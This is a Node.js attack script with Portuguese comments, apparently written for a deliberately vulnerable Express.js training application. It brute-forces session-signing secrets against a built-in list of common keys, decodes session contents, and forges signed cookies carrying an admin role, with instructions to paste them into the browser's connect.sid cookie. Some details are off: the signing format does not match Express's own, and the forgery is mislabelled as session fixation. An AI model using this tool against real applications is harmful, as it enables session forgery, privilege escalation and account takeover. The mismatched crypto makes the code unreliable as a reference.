#!/usr/bin/env node

/**
 * Session Cookie Decoder para a Aplicação Vulnerável
 * 
 * Este script demonstra como decodificar cookies de sessão do Express.js
 * quando a chave secreta é conhecida ou fraca.
 */

const crypto = require('crypto');

// Chave secreta fraca da aplicação (obtida do código fonte)
const SECRET_KEY = 'weak-secret-key';

/**
 * Decodifica um cookie de sessão do Express.js
 * @param {string} signedCookie - Cookie assinado (formato: s:valor.assinatura)
 * @param {string} secret - Chave secreta usada para assinar
 * @returns {object|null} - Dados da sessão decodificados ou null se inválido
 */
function decodeSessionCookie(signedCookie, secret) {
    try {
        // Remove o prefixo 's:' se presente
        if (signedCookie.startsWith('s:')) {
            signedCookie = signedCookie.slice(2);
        }
        
        // URL decode se necessário
        signedCookie = decodeURIComponent(signedCookie);
        
        // Separa o valor da assinatura
        const lastDot = signedCookie.lastIndexOf('.');
        if (lastDot === -1) {
            throw new Error('Cookie malformado - sem assinatura');
        }
        
        const value = signedCookie.slice(0, lastDot);
        const signature = signedCookie.slice(lastDot + 1);
        
        // Verifica a assinatura HMAC-SHA256
        const expectedSignature = crypto
            .createHmac('sha256', secret)
            .update(value)
            .digest('base64')
            .replace(/=/g, '')
            .replace(/\+/g, '-')
            .replace(/\//g, '_');
        
        if (signature !== expectedSignature) {
            console.log('⚠️  Assinatura inválida!');
            console.log('Esperado:', expectedSignature);
            console.log('Recebido:', signature);
            return null;
        }
        
        // Decodifica o valor base64 URL-safe
        const decoded = Buffer.from(value, 'base64').toString('utf8');
        
        // Parse do JSON
        const sessionData = JSON.parse(decoded);
        
        return sessionData;
    } catch (error) {
        console.error('Erro ao decodificar cookie:', error.message);
        return null;
    }
}

/**
 * Cria um cookie de sessão falso (para demonstração de session fixation)
 * @param {object} sessionData - Dados da sessão
 * @param {string} secret - Chave secreta
 * @returns {string} - Cookie assinado
 */
function createFakeSessionCookie(sessionData, secret) {
    try {
        // Serializa os dados da sessão
        const jsonData = JSON.stringify(sessionData);
        
        // Codifica em base64 URL-safe
        const encoded = Buffer.from(jsonData).toString('base64');
        
        // Cria assinatura HMAC-SHA256
        const signature = crypto
            .createHmac('sha256', secret)
            .update(encoded)
            .digest('base64')
            .replace(/=/g, '')
            .replace(/\+/g, '-')
            .replace(/\//g, '_');
        
        // Retorna o cookie completo
        return `s:${encoded}.${signature}`;
    } catch (error) {
        console.error('Erro ao criar cookie falso:', error.message);
        return null;
    }
}

/**
 * Força bruta em chaves secretas comuns
 * @param {string} signedCookie - Cookie para decodificar
 * @returns {object|null} - Resultado da decodificação
 */
function bruteForceSecret(signedCookie) {
    const commonSecrets = [
        'weak-secret-key',
        'secret',
        'mysecret',
        'secretkey',
        'key',
        'password',
        '123456',
        'admin',
        'secret123',
        'keyboard-cat',
        'your-secret-key',
        'change-this-secret',
        'default-secret',
        'super-secret',
        'session-secret'
    ];
    
    console.log('🔓 Tentando força bruta nas chaves secretas comuns...\n');
    
    for (const secret of commonSecrets) {
        console.log(`Testando chave: "${secret}"`);
        const result = decodeSessionCookie(signedCookie, secret);
        
        if (result) {
            console.log(`✅ SUCESSO! Chave encontrada: "${secret}"\n`);
            return { secret, sessionData: result };
        }
    }
    
    console.log('❌ Nenhuma chave comum funcionou');
    return null;
}

// Função principal
function main() {
    console.log('🔍 Session Cookie Decoder - Aplicação Vulnerável\n');
    
    // Exemplo de uso
    const args = process.argv.slice(2);
    
    if (args.length === 0) {
        console.log('Uso: node session-decoder.js <cookie-value> [secret]');
        console.log('');
        console.log('Exemplos:');
        console.log('  # Decodificar com chave conhecida');
        console.log('  node session-decoder.js "s:eyJ1c2VyIjp7ImlkIjoxLCJ1c2VybmFtZSI6ImFkbWluIn19.signature" weak-secret-key');
        console.log('');
        console.log('  # Força bruta automática');
        console.log('  node session-decoder.js "s:eyJ1c2VyIjp7ImlkIjoxLCJ1c2VybmFtZSI6ImFkbWluIn19.signature"');
        console.log('');
        console.log('  # Criar cookie falso (Session Fixation)');
        console.log('  node session-decoder.js --create \'{"user":{"id":1,"username":"admin","role":"admin"}}\'');
        return;
    }
    
    const cookieValue = args[0];
    const secret = args[1];
    
    // Modo de criação de cookie falso
    if (cookieValue === '--create') {
        const sessionData = JSON.parse(args[1] || '{"user":{"id":1,"username":"hacker","role":"admin"}}');
        const fakeCookie = createFakeSessionCookie(sessionData, SECRET_KEY);
        
        console.log('🎭 Cookie falso criado:');
        console.log('Dados:', JSON.stringify(sessionData, null, 2));
        console.log('Cookie:', fakeCookie);
        console.log('');
        console.log('💡 Para usar: substitua o valor do cookie connect.sid no navegador');
        return;
    }
    
    let result;
    
    if (secret) {
        // Usar chave fornecida
        console.log(`🔑 Usando chave secreta: "${secret}"\n`);
        const sessionData = decodeSessionCookie(cookieValue, secret);
        result = sessionData ? { secret, sessionData } : null;
    } else {
        // Força bruta automática
        result = bruteForceSecret(cookieValue);
    }
    
    if (result) {
        console.log('📋 DADOS DA SESSÃO DECODIFICADOS:');
        console.log('================================');
        console.log('Chave secreta:', result.secret);
        console.log('Dados da sessão:');
        console.log(JSON.stringify(result.sessionData, null, 2));
        
        if (result.sessionData.user) {
            console.log('\n👤 INFORMAÇÕES DO USUÁRIO:');
            console.log('ID:', result.sessionData.user.id);
            console.log('Username:', result.sessionData.user.username);
            console.log('Role:', result.sessionData.user.role);
        }
        
        console.log('\n🚨 VULNERABILIDADES IDENTIFICADAS:');
        console.log('- Chave secreta fraca e previsível');
        console.log('- Cookie não HTTPOnly completo');
        console.log('- Dados sensíveis no cookie');
        console.log('- Possível Session Fixation');
        
    } else {
        console.log('❌ Não foi possível decodificar o cookie');
    }
}

// Exportar funções para uso como módulo
module.exports = {
    decodeSessionCookie,
    createFakeSessionCookie,
    bruteForceSecret,
    SECRET_KEY
};

// Executar se chamado diretamente
if (require.main === module) {
    main();
}